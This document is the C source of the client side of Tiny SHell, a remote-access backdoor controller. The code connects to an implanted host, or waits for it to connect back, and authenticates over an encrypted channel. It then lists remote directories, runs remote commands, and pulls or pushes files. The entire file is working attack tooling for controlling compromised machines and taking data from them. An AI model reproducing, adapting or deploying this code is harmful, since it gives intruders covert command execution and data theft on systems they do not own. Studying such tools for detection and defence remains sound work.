/*
 * Tiny SHell version 0.6 - client side,
 * by Christophe Devine <devine@cr0.net>;
 * this program is licensed under the GPL.
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <termios.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <netdb.h>

#include "tsh.h"
#include "pel.h"

unsigned char message[BUFSIZE + 1];
extern char *optarg;
extern int optind;

/* function declaration */

int tsh_get_file( int server, char *argv3, char *argv4 );
int tsh_put_file( int server, char *argv3, char *argv4 );
int tsh_ls_dir( int server, char *argv3 );
int tsh_execv( int server, char *argv3 );

void pel_error( char *s );

/* program entry point */

void usage(char *argv0)
{
    fprintf(stderr, "Usage: %s [ -s secret ] [ -p port ] [command]\n"
        "\n"
        "   <hostname|cb>\n"
        "   <hostname|cb> ls <remote-dir>\n"
        "   <hostname|cb> exec <remote-command>\n"
        "   <hostname|cb> get <source-file> <dest-dir>\n"
        "   <hostname|cb> put <source-file> <dest-dir>\n", argv0);
    exit(1);
}

int main( int argc, char *argv[] )
{
    int ret, client, server;
    socklen_t n;
    int opt;
    struct sockaddr_in server_addr;
    struct sockaddr_in client_addr;
    struct hostent *server_host;
    char action, *password;

    while ((opt = getopt(argc, argv, "p:s:")) != -1) {
        switch (opt) {
            case 'p':
                server_port=atoi(optarg); /* We hope ... */
                if (!server_port) usage(*argv);
                break;
            case 's':
                secret=optarg; 
                break;
            default: /* '?' */
                usage(*argv);
                break;
        }
    }
    argv+=(optind-1);
    argc-=(optind-1);
    action = 0;

    password = NULL;

    /* check the arguments */

    if( argc== 4 && ! strcmp( argv[2], "ls" ) )
    {
        action = LS_DIR;
    }

    if( argc== 4 && ! strcmp( argv[2], "exec" ) )
    {
        action = EXEC_BIN;
    }

    if( argc== 5 && ! strcmp( argv[2], "get" ) )
    {
        action = GET_FILE;
    }

    if( argc== 5 && ! strcmp( argv[2], "put" ) )
    {
        action = PUT_FILE;
    }

    if( action == 0 ) return( 1 );

connect:

    if( strcmp( argv[1], "cb" ) != 0 )
    {
        /* create a socket */

        server = socket( AF_INET, SOCK_STREAM, 0 );

        if( server < 0 )
        {
            perror( "socket" );
            return( 2 );
        }

        server_host = gethostbyname( argv[1] );

        if( server_host == NULL )
        {
            perror( "gethostbyname");
            return( 3 );
        }

        memcpy( (void *) &server_addr.sin_addr,
                (void *) server_host->h_addr,
                server_host->h_length );

        server_addr.sin_family = AF_INET;
        server_addr.sin_port   = htons( server_port );

        /* connect to the remote host */

        ret = connect( server, (struct sockaddr *) &server_addr,
                       sizeof( server_addr ) );

        if( ret < 0 )
        {
            perror( "connect" );
            return( 4 );
        }
    }
    else
    {
        /* create a socket */

        client = socket( AF_INET, SOCK_STREAM, 0 );

        if( client < 0 )
        {
            perror( "socket" );
            return( 5 );
        }

        /* bind the client on the port the server will connect to */

        n = 1;

        ret = setsockopt( client, SOL_SOCKET, SO_REUSEADDR,
                          (void *) &n, sizeof( n ) );

        if( ret < 0 )
        {
            perror( "setsockopt" );
            return( 6 );
        }

        client_addr.sin_family      = AF_INET;
        client_addr.sin_port        = htons( server_port );
        client_addr.sin_addr.s_addr = INADDR_ANY;

        ret = bind( client, (struct sockaddr *) &client_addr,
                    sizeof( client_addr ) );

        if( ret < 0 )
        {
            perror( "bind" );
            return( 7 );
        }

        if( listen( client, 5 ) < 0 )
        {
            perror( "listen" );
            return( 8 );
        }

        fprintf( stderr, "Waiting for the server to connect..." );
        fflush( stderr );

        n = sizeof( server_addr );

        server = accept( client, (struct sockaddr *)
                         &server_addr, &n );

        if( server < 0 )
        {
            perror( "accept" );
            return( 9 );
        }

        fprintf( stderr, "connected.\n" );

        close( client );
    }

    /* setup the packet encryption layer */

    if( password == NULL )
    {
        /* 1st try, using the built-in secret key */

        ret = pel_client_init( server, secret );

        if( ret != PEL_SUCCESS )
        {
            close( server );

            /* secret key invalid, so ask for a password */

            password = getpass( "Password: " );
            goto connect;
        }
    }
    else
    {
        /* 2nd try, with the user's password */

        ret = pel_client_init( server, password );

        memset( password, 0, strlen( password ) );

        if( ret != PEL_SUCCESS )
        {
            /* password invalid, exit */

            fprintf( stderr, "Authentication failed.\n" );
            shutdown( server, 2 );
            return( 10 );
        }

    }

    /* send the action requested by the user */

    ret = pel_send_msg( server, (unsigned char *) &action, 1 );

    if( ret != PEL_SUCCESS )
    {
        pel_error( "pel_send_msg" );
        shutdown( server, 2 );
        return( 11 );
    }

    /* howdy */

    switch( action )
    {
        case LS_DIR:

            ret = tsh_ls_dir( server, argv[3] );
            break;

        case EXEC_BIN:

            ret = tsh_execv( server, argv[3] );
            break;

        case GET_FILE:

            ret = tsh_get_file( server, argv[3], argv[4] );
            break;

        case PUT_FILE:

            ret = tsh_put_file( server, argv[3], argv[4] );
            break;

        default:

            ret = -1;
            break;
    }

    shutdown( server, 2 );

    return( ret );
}

int tsh_get_file( int server, char *argv3, char *argv4 )
{
    char *temp, *pathname;
    int ret, len, fd, total;

    /* send remote filename */

    len = strlen( argv3 );

    ret = pel_send_msg( server, (unsigned char *) argv3, len );

    if( ret != PEL_SUCCESS )
    {
        pel_error( "pel_send_msg" );
        return( 12 );
    }

    /* create local file */

    temp = strrchr( argv3, '/' );

    if( temp != NULL ) temp++;
    if( temp == NULL ) temp = argv3;

    len = strlen( argv4 );

    pathname = (char *) malloc( len + strlen( temp ) + 2 );

    if( pathname == NULL )
    {
        perror( "malloc" );
        return( 13 );
    }

    strcpy( pathname, argv4 );
    strcpy( pathname + len, "/" );
    strcpy( pathname + len + 1, temp );

    fd = creat( pathname, 0644 );

    if( fd < 0 )
    {
        perror( "creat" );
        return( 14 );
    }

    free( pathname );

    /* transfer from server */

    total = 0;

    while( 1 )
    {
        ret = pel_recv_msg( server, message, &len );

        if( ret != PEL_SUCCESS )
        {
            if( pel_errno == PEL_CONN_CLOSED && total > 0 )
            {
                break;
            }

            pel_error( "pel_recv_msg" );
            fprintf( stderr, "Transfer failed.\n" );
            return( 15 );
        }

        if( write( fd, message, len ) != len )
        {
            perror( "write" );
            return( 16 );
        }

        total += len;

        printf( "%d\r", total );
        fflush( stdout );
    }

    printf( "%d done.\n", total );

    return( 0 );
}

int tsh_put_file( int server, char *argv3, char *argv4 )
{
    char *temp, *pathname;
    int ret, len, fd, total;

    /* send remote filename */

    temp = strrchr( argv3, '/' );

    if( temp != NULL ) temp++;
    if( temp == NULL ) temp = argv3;

    len = strlen( argv4 );

    pathname = (char *) malloc( len + strlen( temp ) + 2 );

    if( pathname == NULL )
    {
        perror( "malloc" );
        return( 17 );
    }

    strcpy( pathname, argv4 );
    strcpy( pathname + len, "/" );
    strcpy( pathname + len + 1, temp );

    len = strlen( pathname );

    ret = pel_send_msg( server, (unsigned char *) pathname, len );

    if( ret != PEL_SUCCESS )
    {
        pel_error( "pel_send_msg" );
        return( 18 );
    }

    free( pathname );

    /* open local file */

    fd = open( argv3, O_RDONLY );

    if( fd < 0 )
    {
        perror( "open" );
        return( 19 );
    }

    /* transfer to server */

    total = 0;

    while( 1 )
    {
        len = read( fd, message, BUFSIZE );

        if( len < 0 )
        {
            perror( "read" );
            return( 20 );
        }

        if( len == 0 )
        {
            break;
        }

        ret = pel_send_msg( server, message, len );

        if( ret != PEL_SUCCESS )
        {
            pel_error( "pel_send_msg" );
            fprintf( stderr, "Transfer failed.\n" );
            return( 21 );
        }

        total += len;

        printf( "%d\r", total );
        fflush( stdout );
    }

    printf( "%d done.\n", total );

    return( 0 );
}

int tsh_ls_dir( int server, char *argv3 )
{
    int ret, len;

    /* send remote directory path */

    len = strlen( argv3 );

    ret = pel_send_msg( server, (unsigned char *) argv3, len );

    if( ret != PEL_SUCCESS )
    {
        pel_error( "pel_send_msg" );
        return( 34 );
    }

    /* receive directory listing from server */

    while( 1 )
    {
        ret = pel_recv_msg( server, message, &len );

        if( ret != PEL_SUCCESS )
        {
            if( pel_errno == PEL_CONN_CLOSED )
            {
                break;
            }

            pel_error( "pel_recv_msg" );
            fprintf( stderr, "Directory listing failed.\n" );
            return( 35 );
        }

        if( write( 1, message, len ) != len )
        {
            perror( "write" );
            return( 36 );
        }
    }

    return( 0 );
}

int tsh_execv( int server, char *argv3 )
{
    int ret, len;

    /* send remote command */

    len = strlen( argv3 );

    ret = pel_send_msg( server, (unsigned char *) argv3, len );

    if( ret != PEL_SUCCESS )
    {
        pel_error( "pel_send_msg" );
        return( 37 );
    }

    /* receive exit code from server */

    ret = pel_recv_msg( server, message, &len );

    if( ret != PEL_SUCCESS )
    {
        pel_error( "pel_recv_msg" );
        fprintf( stderr, "Execution failed.\n" );
        return( 38 );
    }

    if( len == 1 )
    {
        printf( "Exit code: %d\n", (int) message[0] );
    }
    else
    {
        fprintf( stderr, "Unexpected response length from server.\n" );
        return( 39 );
    }

    return( 0 );
}

void pel_error( char *s )
{
    switch( pel_errno )
    {
        case PEL_CONN_CLOSED:

            fprintf( stderr, "%s: Connection closed.\n", s );
            break;

        case PEL_SYSTEM_ERROR:

            perror( s );
            break;

        case PEL_WRONG_CHALLENGE:

            fprintf( stderr, "%s: Wrong challenge.\n", s );
            break;

        case PEL_BAD_MSG_LENGTH:

            fprintf( stderr, "%s: Bad message length.\n", s );
            break;

        case PEL_CORRUPTED_DATA:

            fprintf( stderr, "%s: Corrupted data.\n", s );
            break;

        case PEL_UNDEFINED_ERROR:

            fprintf( stderr, "%s: No error.\n", s );
            break;

        default:

            fprintf( stderr, "%s: Unknown error code.\n", s );
            break;
    }
}
